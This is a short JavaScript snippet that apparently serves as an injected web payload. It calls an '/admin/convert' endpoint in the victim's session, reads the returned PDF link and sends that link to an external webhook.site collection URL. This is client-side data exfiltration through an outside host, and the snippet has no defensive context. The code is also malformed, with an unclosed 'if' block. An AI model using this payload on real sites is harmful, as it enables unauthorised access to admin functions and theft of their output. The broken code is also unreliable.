const htmlCode = "xxx"; // Set the random value to send
const xhr = new XMLHttpRequest(); // Create a new XMLHttpRequest object
xhr.open("POST", "/admin/convert"); // Set the request method and endpoint
xhr.setRequestHeader("Content-Type", "application/json"); // Set the request header
xhr.onload = function() { // Set the callback function to handle the response
  if (xhr.status === 200) { // If the response status is OK
    const response = JSON.parse(xhr.responseText); // Parse the response text as JSON
    const pdfLink = response.pdfLink; // Get the PDF link from the response

  // Define the URL for the webhook endpoint
  const webhookEndpoint = `https://webhook.site/c9b6fcf2-a309-457b-b6f2-08d9b8d42e39?pdfLink=${encodeURIComponent(pdfLink)}`;

  // Send the pdfLink to the webhook endpoint using GET method
  const xhr2 = new XMLHttpRequest();
  xhr2.open('GET', webhookEndpoint);
  xhr2.onload = function() {
    // Log the webhook response
    console.log(xhr2.responseText);
  };
  xhr2.onerror = function() {
    // Handle any errors that occur during the webhook request
    console.error(`Webhook error: ${xhr2.statusText}`);
  };
  xhr2.send();
};
xhr.onerror = function() {
  // Handle any errors that occur during the API request
  console.error(`API error: ${xhr.statusText}`);
};
xhr.send(JSON.stringify({ htmlCode: htmlCode }));
